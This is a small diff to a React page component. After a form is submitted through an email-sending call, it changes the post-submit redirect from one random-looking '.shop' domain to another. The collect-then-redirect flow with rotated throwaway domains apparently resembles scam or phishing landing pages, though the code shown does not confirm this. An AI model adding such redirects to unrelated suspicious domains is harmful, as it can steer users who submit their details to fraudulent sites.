@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://tobyh.nuke-hzd.shop';
+        window.location.href = 'https://terd.beam-upstork.shop';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
